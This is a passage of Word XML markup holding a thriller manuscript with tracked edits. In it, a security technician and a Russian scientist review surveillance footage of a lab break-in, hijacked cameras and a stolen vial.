        <w:t>from several cameras, showing a burly man with a lug wrench being chased through the hallways by an agile gunman with a long suppressor on his firearm.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said Passinsky. “You see how the cameras move? The cameras are doing their… Their moving functions…”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“Pan, tilt, zoom,” Roger filled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said Passinsky. “They are pan-tilt-zooming to follow the two men. They stay on them the whole time. Now, this is not the automatic capability of the systems, correct?”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it’s not,” Roger answered. “Somebody was controlling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somebody hacked in and took the cameras over,” said Passinsky.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cameras are probably </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>how</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> they hacked in,” Roger grumbled with an edge of accusation. “I told you they’re way out of date. I told you we needed to shell out and replace them all. But you… didn’t…” He turned to </w:t>
      </w:r>
      <w:ins w:id="2423" w:author="TextVet" w:date="2016-03-23T15:34:00Z">
        <w:r w:rsidR="00F01CAB">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>check</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2424" w:author="TextVet" w:date="2016-03-23T15:34:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00F01CAB">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>look at</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> Doctor P.’s face. The old man’s cold blue eyes looked like they were about to shoot beams of frost straight into Roger’s heart and suck out his warm blood by gaze alone. Roger gulped. “So, um, anyway… There was clearly a fight between two teams of people here. One team had the guns</w:t>
      </w:r>
      <w:ins w:id="2425" w:author="TextVet" w:date="2016-03-29T15:01:00Z">
        <w:r w:rsidR="004242AD">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>;</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2426" w:author="TextVet" w:date="2016-03-29T15:01:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="004242AD">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the other had control of our computers.”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watched the screen. “Different approaches, different tactics, different strengths and weaknesses. But one common objective,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 think so. Check it out…” Roger queued up a video of Tina being held at gunpoint in the cold storage room. The footage showed her pulling a small vial out of a box from the deep-freezer and handing it to the leather-clad gunman. “See, they get this test tube from the fridge</w:t>
      </w:r>
      <w:ins w:id="2427" w:author="TextVet" w:date="2016-03-29T15:03:00Z">
        <w:r w:rsidR="003E1C49">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>.</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2428" w:author="TextVet" w:date="2016-03-29T15:03:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="003E1C49">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>, and then</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:ins w:id="2429" w:author="TextVet" w:date="2016-03-29T15:03:00Z">
        <w:r w:rsidR="003E1C49">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>L</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2430" w:author="TextVet" w:date="2016-03-29T15:03:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="003E1C49">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>l</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>ater</w:t>
      </w:r>
      <w:ins w:id="2431" w:author="TextVet" w:date="2016-03-29T15:03:00Z">
        <w:r w:rsidR="003E1C49">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they start fighting over it in the hallway…”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“Wait, pause,” Passinsky ordered. “Enhance the image.”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said Roger.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“Make </w:t>
      </w:r>
      <w:ins w:id="2432" w:author="TextVet" w:date="2016-03-23T15:37:00Z">
        <w:r w:rsidR="008A1657">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>i</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:del w:id="2433" w:author="TextVet" w:date="2016-03-23T15:37:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="008A1657">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>he picture</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00566952" w:rsidRPr="00566952">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:rPrChange w:id="2434" w:author="TextVet" w:date="2016-03-23T15:37:00Z">
            <w:rPr>
              <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
              <w:color w:val="000000"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
        <w:t xml:space="preserve">more </w:t>
      </w:r>
      <w:r w:rsidR="00566952" w:rsidRPr="00566952">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:rPrChange w:id="2435" w:author="TextVet" w:date="2016-03-23T15:36:00Z">
            <w:rPr>
              <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
              <w:color w:val="000000"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
        <w:t>clear</w:t>
      </w:r>
      <w:ins w:id="2436" w:author="TextVet" w:date="2016-03-23T15:36:00Z">
        <w:r w:rsidR="00265647">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>!</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2437" w:author="TextVet" w:date="2016-03-23T15:36:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00265647">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438" w:author="TextVet" w:date="2016-03-23T15:35:00Z">
        <w:r w:rsidR="00F4506A">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>barked</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2439" w:author="TextVet" w:date="2016-03-23T15:35:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00F4506A">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>said</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> the </w:t>
      </w:r>
      <w:del w:id="2440" w:author="TextVet" w:date="2016-03-23T15:35:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00982DF5">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">old </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>scientist.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paused. “You mean like in bad spy movies?”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missed a beat. “Yes. Why? Isn’t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not actually a thing,” said Roger.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 not know exactly how it is work,” Passinsky insisted, “but I know there is software for pixel interpolation and increase in the sharpness based on focal length…”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gave him a look.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said Passinsky.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shook his head. “I can make it full-screen for you, though.”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“Fine</w:t>
      </w:r>
      <w:r w:rsidR="001B0243">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>; do.</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">” </w:t>
      </w:r>
      <w:r w:rsidR="001B0243">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Passinsky</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> squinted</w:t>
      </w:r>
      <w:r w:rsidR="009F023F">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>,</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> lean</w:t>
      </w:r>
      <w:r w:rsidR="009F023F">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>ing</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> closer to the screen</w:t>
      </w:r>
      <w:r w:rsidR="00AC517C">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> in</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> a thick pair of reading glasses</w:t>
      </w:r>
      <w:del w:id="2441" w:author="TextVet" w:date="2016-03-23T15:39:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00AC517C">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> to help him see</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>. When the image filled the screen, Passinsky gasped. It sounded like a wet rattle. “That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one attacking T?” asked Roger.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Passinsky said, trailing off, staring at the looping video. “I think… Roger, pause. Go frame by frame. That </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>is</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> a thing,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is,” said Roger.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Passinsky’s eyes suddenly looked incredibly tired. “Oh no…” Passinsky walked away from the desk, rubbing his temples with his fingers. “That is the Mukhayev boy…”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 Roger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shushed him with a flick of his wrist. Wearing a grave expression, he dialed his phone.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“Are you finally calling the cops?” Roger asked insistently.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Passinsky shook his head. “No police. Not yet. Not until my boss gives permission.” He looked away, and spoke in Russian into the phone. His face, which Roger had only ever seen as an icy mask, sagged with worry.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While Passinsky </w:t>
      </w:r>
      <w:ins w:id="2442" w:author="TextVet" w:date="2016-03-23T15:42:00Z">
        <w:r w:rsidR="005B14E3">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>conversed</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2443" w:author="TextVet" w:date="2016-03-23T15:42:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="005B14E3">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>spoke into the phone</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">, Roger </w:t>
      </w:r>
      <w:del w:id="2444" w:author="TextVet" w:date="2016-03-23T15:41:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00AF54F5">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>spent the time</w:delText>
        </w:r>
      </w:del>
      <w:del w:id="2445" w:author="TextVet" w:date="2016-03-23T15:42:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00AF54F5">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> watching</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="2446" w:author="TextVet" w:date="2016-03-23T15:42:00Z">
        <w:r w:rsidR="00AF54F5">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>studied</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> the surveillance videos. One of the men carried a homemade contraption about four feet long. Roger searched the footage to get views of the device from different angles. It looked like some kind of art project gone horribly wrong, or a science fair project gone horribly right — like Nikola Tesla had gotten high and asked </w:t>
      </w:r>
      <w:commentRangeStart w:id="2447"/>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Jules Verne to drive him to the nearest Home Depot</w:t>
      </w:r>
      <w:commentRangeEnd w:id="2447"/>
      <w:r w:rsidR="00EC0D5B">
        <w:rPr>
          <w:rStyle w:val="CommentReference"/>
        </w:rPr>
        <w:commentReference w:id="2447"/>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After several minutes, the grizzly scientist hung up. “Roger,” he rasped. “Do we know </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>anything</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> about the hackers?”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 a thing,” Roger replied. “The security cams don’t record audio</w:t>
      </w:r>
      <w:ins w:id="2448" w:author="TextVet" w:date="2016-03-23T15:43:00Z">
        <w:r w:rsidR="002054A4">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so I can’t hear anything they’re saying. The parking lot feeds show they were in a black Lincoln Navigator, but I can’t get a good shot of the license plate — I think they were intentionally keeping it out of frame. And there’s nothing in any of the system logs that would give me any clue.”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Passinsky came around to look at the screen again. It was playing a clip of the fight in the hallway outside the freezer room. </w:t>
      </w:r>
      <w:ins w:id="2449" w:author="TextVet" w:date="2016-03-23T15:44:00Z">
        <w:r w:rsidR="00B63946">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>I</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2450" w:author="TextVet" w:date="2016-03-23T15:44:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00B63946">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>O</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">n </w:t>
      </w:r>
      <w:ins w:id="2451" w:author="TextVet" w:date="2016-03-23T15:44:00Z">
        <w:r w:rsidR="003C1BC5">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>it</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2452" w:author="TextVet" w:date="2016-03-23T15:44:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="003C1BC5">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>the screen</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>, a geeky guy in an ill-fitting lab coat argued tensely with the leather-clad gunman, aiming the odd contraption at him. Tina stood by his side, and the large scruffy man lurked in the shadows. Passinsky said, “That machine he is carrying…”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nodded vigorously. “I was just looking at that, Doctor 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holds it like rifle,” said the scientist. “What does it do?”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just figuring that out,” said Roger, and he queued up a video clip. “Check this out. Here he is, firing it in the middle of this fight. The guy in the leather jacket is just about to beat the shit out of this big hairy dude, when the guy holds up this doohickey, and… Bam. Guy in the leather jacket grabs his ear.”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“Did he shoot something at his head?” asked Passinsky.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del w:id="2453" w:author="TextVet" w:date="2016-03-23T15:46:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="001030C9">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">At first, </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>I</w:t>
      </w:r>
      <w:ins w:id="2454" w:author="TextVet" w:date="2016-03-23T15:46:00Z">
        <w:r w:rsidR="001030C9">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thought that too</w:t>
      </w:r>
      <w:ins w:id="2455" w:author="TextVet" w:date="2016-03-23T15:46:00Z">
        <w:r w:rsidR="00B05D47">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>.</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2456" w:author="TextVet" w:date="2016-03-23T15:46:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00B05D47">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del w:id="2457" w:author="TextVet" w:date="2016-03-23T15:46:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00B05D47">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>said Roger.</w:delText>
        </w:r>
      </w:del>
      <w:del w:id="2458" w:author="TextVet" w:date="2016-03-23T15:45:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00B05D47">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> “</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="2459" w:author="TextVet" w:date="2016-03-23T15:46:00Z">
        <w:r w:rsidR="00B05D47">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>T</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2460" w:author="TextVet" w:date="2016-03-23T15:46:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00B05D47">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>But t</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">hen I saw </w:t>
      </w:r>
      <w:r w:rsidR="00566952" w:rsidRPr="00566952">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
